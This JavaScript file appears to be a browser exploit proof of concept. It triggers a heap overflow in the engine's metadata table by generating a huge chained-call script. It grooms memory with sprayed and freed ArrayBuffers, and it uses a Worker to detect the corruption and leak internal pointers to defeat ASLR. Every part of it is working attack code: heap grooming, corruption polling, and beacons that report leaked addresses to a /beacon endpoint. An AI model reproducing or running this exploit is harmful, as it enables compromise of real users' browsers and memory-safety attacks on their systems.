// p504 — MetadataTable overflow: CHAINED CALLS + WORKER POLLING
//
// Combines V501 chained calls (1.25GB AST vs 2.4GB) with V503 Worker polling.
//
// WHY WORKER POLLING:
//   The 4.3GB sweep in finishCreation() will eventually SIGSEGV when it hits
//   unmapped memory. But the Worker AB targets at lower offsets are corrupted
//   BEFORE the crash. Worker detects and beacons the corruption in time.
//
// WHY CHAINED CALLS:
//   a()()()...() (50 per chain) → 50 op_call entries per AST statement.
//   38M calls in 767K statements → ~1.25GB AST vs ~2.4GB for individual a();
//   This is what got V501 past PARSED + CALLING (V500 died at BLOB).
//
// Flow:
//   Main: spray 100 baits → Worker allocates 100 targets → Main frees baits →
//   GC → build blob (75MB, chained calls) → load (lazy parse) → signal Worker →
//   call function → full parse → bytecodeGen → finishCreation (sweep) →
//   Worker detects corruption → beacons thunk pointers → process eventually crashes
//
// Beacon prefix: V504-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V504-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // Phase 1: Spray bait ABs at low addresses
  var BAIT_N = 100;
  var BUF_SZ = 100112;
  var baits = new Array(BAIT_N);
  for (var i = 0; i < BAIT_N; i++) {
    baits[i] = new ArrayBuffer(BUF_SZ);
  }
  B('BAITS', 'n=' + BAIT_N);

  // Phase 2: Create Worker with target ABs at higher addresses
  var workerCode = [
    'var T0W = Date.now();',
    'function BW(tag, body) {',
    '  try {',
    '    var x = new XMLHttpRequest();',
    '    x.open("POST", "/beacon/V504-W-" + tag, false);',
    '    x.setRequestHeader("Content-Type", "text/plain");',
    '    x.send("[" + (Date.now() - T0W) + "ms] " + (body || ""));',
    '  } catch(e) {}',
    '}',
    'function hexB(v) { return (v < 16 ? "0" : "") + v.toString(16); }',
    'function hex8(view, off) {',
    '  var s = "";',
    '  for (var i = 7; i >= 0; i--) s += hexB(view[off + i]);',
    '  return s;',
    '}',
    'function u32(view, off) {',
    '  return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;',
    '}',
    '',
    'var TARGET_N = 100;',
    'var BUF_SZ = 100112;',
    'var targets = [];',
    'var views = [];',
    'for (var i = 0; i < TARGET_N; i++) {',
    '  var ab = new ArrayBuffer(BUF_SZ);',
    '  targets.push(ab);',
    '  views.push(new Uint8Array(ab));',
    '}',
    'BW("TARGETS", "n=" + TARGET_N);',
    'postMessage({type: "ready"});',
    '',
    'onmessage = function(e) {',
    '  if (e.data.type !== "go") return;',
    '  T0W = Date.now();',
    '  BW("POLLING", "start");',
    '',
    '  // Busy-poll ALL targets indefinitely until corruption found or killed',
    '  var found = false;',
    '  var polls = 0;',
    '  while (!found) {',
    '    polls++;',
    '    for (var vi = 0; vi < TARGET_N; vi++) {',
    '      var v = views[vi];',
    '      // Quick 8-byte aligned scan of first 1024 bytes',
    '      for (var q = 0; q < 1024; q += 8) {',
    '        if (v[q] !== 0 || v[q+1] !== 0 || v[q+2] !== 0 || v[q+3] !== 0) {',
    '          found = true;',
    '          BW("FIRST-HIT", "idx=" + vi + ",polls=" + polls + ",off=" + q);',
    '          break;',
    '        }',
    '      }',
    '      if (found) break;',
    '    }',
    '    if (polls % 1000000 === 0) BW("STILL-POLLING", "p=" + polls);',
    '  }',
    '',
    '  // Corruption detected! Extract data from ALL targets immediately',
    '  var hitCount = 0;',
    '  var leakedPtrs = [];',
    '',
    '  for (var vi = 0; vi < TARGET_N; vi++) {',
    '    var v = views[vi];',
    '    var nz = 0;',
    '    var firstOff = -1;',
    '    for (var j = 0; j < v.length; j++) {',
    '      if (v[j] !== 0) {',
    '        if (firstOff === -1) firstOff = j;',
    '        nz++;',
    '      }',
    '    }',
    '    if (nz === 0) continue;',
    '    hitCount++;',
    '',
    '    if (hitCount <= 3) {',
    '      BW("HIT-" + vi, "nz=" + nz + ",first=" + firstOff);',
    '',
    '      // Auto-detect entry alignment',
    '      var bestBase = -1, bestHits = 0;',
    '      for (var tryBase = 0; tryBase < 112; tryBase += 4) {',
    '        var hits = 0;',
    '        for (var off = tryBase; off + 8 <= v.length; off += 112) {',
    '          if (v[off] !== 0 || v[off+1] !== 0 || v[off+2] !== 0 || v[off+3] !== 0 ||',
    '              v[off+4] !== 0 || v[off+5] !== 0 || v[off+6] !== 0 || v[off+7] !== 0) hits++;',
    '        }',
    '        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }',
    '      }',
    '      BW("EBASE-" + vi, "base=" + bestBase + ",hits=" + bestHits);',
    '',
    '      // Extract thunk pointers at entryBase+24',
    '      var ptrsDumped = 0;',
    '      for (var eOff = bestBase; eOff + 112 <= v.length && ptrsDumped < 8; eOff += 112) {',
    '        var pOff = eOff + 24;',
    '        if (pOff + 8 > v.length) break;',
    '        if (v[pOff] === 0 && v[pOff+1] === 0 && v[pOff+2] === 0 && v[pOff+3] === 0 &&',
    '            v[pOff+4] === 0 && v[pOff+5] === 0 && v[pOff+6] === 0 && v[pOff+7] === 0) continue;',
    '        var h = hex8(v, pOff);',
    '        BW("THUNK-" + ptrsDumped, "off=" + pOff + ",val=0x" + h);',
    '        if (leakedPtrs.length < 5) leakedPtrs.push(h);',
    '        ptrsDumped++;',
    '      }',
    '',
    '      // m_bytecodeIndex at entryBase+68',
    '      var idxDumped = 0;',
    '      for (var eOff = bestBase; eOff + 72 <= v.length && idxDumped < 3; eOff += 112) {',
    '        var iOff = eOff + 68;',
    '        if (iOff + 4 > v.length) break;',
    '        var val = u32(v, iOff);',
    '        if (val !== 0) {',
    '          BW("IDX-" + idxDumped, "off=" + iOff + ",val=" + val);',
    '          idxDumped++;',
    '        }',
    '      }',
    '',
    '      // Raw hex dump',
    '      if (hitCount === 1) {',
    '        var chunks = [];',
    '        for (var off = 0; off + 8 <= 256; off += 8) {',
    '          if (v[off] !== 0 || v[off+1] !== 0 || v[off+2] !== 0 || v[off+3] !== 0 ||',
    '              v[off+4] !== 0 || v[off+5] !== 0 || v[off+6] !== 0 || v[off+7] !== 0) {',
    '            chunks.push(off + ":0x" + hex8(v, off));',
    '          }',
    '        }',
    '        if (chunks.length > 0) BW("RAW", chunks.slice(0, 12).join(" "));',
    '      }',
    '    }',
    '  }',
    '',
    '  BW("RESULT", "hitBufs=" + hitCount + ",ptrs=" + leakedPtrs.length);',
    '  if (leakedPtrs.length > 0) {',
    '    BW("ASLR-LEAK", "ptr0=0x" + leakedPtrs[0]);',
    '  }',
    '  BW("DONE", "hitBufs=" + hitCount + ",ptrs=" + leakedPtrs.length);',
    '};'
  ].join('\n');

  var workerBlob = new Blob([workerCode], {type: 'application/javascript'});
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);

  worker.onmessage = function(e) {
    if (e.data.type === 'ready') {
      B('WORKER-READY', '');
      phase3();
    }
  };

  function phase3() {
    // Phase 3: Free baits to create holes at low addresses
    var xferred = 0;
    for (var i = 0; i < BAIT_N; i++) {
      try {
        structuredClone(baits[i], {transfer: [baits[i]]});
        xferred++;
      } catch(e) {
        if (xferred === 0) { B('XFER-ERR', e.message); break; }
      }
      baits[i] = null;
    }
    baits = null;
    B('XFER', 'n=' + xferred);

    // Phase 4: Heavy GC
    for (var g = 0; g < 20; g++) {
      var junk = [];
      for (var j = 0; j < 2000; j++) junk.push(new ArrayBuffer(4096));
      junk = null;
    }
    B('GC-DONE', '');

    // Phase 5: Build blob with CHAINED CALLS + if(0) guard
    var N = 38348816;
    var CHAIN = 50;
    var FULL_CHAINS = Math.floor(N / CHAIN); // 766976
    var REM = N - FULL_CHAINS * CHAIN;       // 16
    B('BUILD', 'N=' + N + ',chain=' + CHAIN);

    var oneChain = 'a' + '()'.repeat(CHAIN) + ';';
    var PART_SZ = 50000;
    var nParts = Math.floor(FULL_CHAINS / PART_SZ);
    var remPart = FULL_CHAINS - nParts * PART_SZ;
    var partStr = oneChain.repeat(PART_SZ);

    // Function declaration (lazy parse) with if(0) guard
    var parts = [];
    parts.push('function __v504fn(a){if(0){');
    for (var p = 0; p < nParts; p++) parts.push(partStr);
    if (remPart > 0) parts.push(oneChain.repeat(remPart));
    if (REM > 0) parts.push('a' + '()'.repeat(REM) + ';');
    parts.push('}}');
    partStr = null;
    oneChain = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB', 'sz=' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onerror = function() { B('SCRIPT-ERR', ''); };

    sc.onload = function() {
      B('PARSED', window.__v504fn ? 'OK' : 'FAIL');

      if (!window.__v504fn) {
        B('DONE', 'parse-fail');
        return;
      }

      // Signal worker to start polling BEFORE the call
      worker.postMessage({type: 'go'});

      // Brief delay for worker to enter polling loop
      setTimeout(function() {
        B('CALLING', '');

        try {
          // Call triggers: full parse → bytecodeGen → finishCreation → SWEEP
          // if(0) prevents execution of body. Function returns normally IF sweep doesn't crash.
          window.__v504fn(0);
          B('SURVIVED', ''); // This means sweep completed AND didn't crash!
        } catch(e) {
          B('CALL-ERR', (e.message || '').substring(0, 60));
        }

        // If we survived, the sweep is complete. Worker may have already reported.
        // Also scan from main thread as backup.
        B('MAIN-DONE', '');
      }, 100);
    };

    document.head.appendChild(sc);
    sc.src = url;
  }
})();
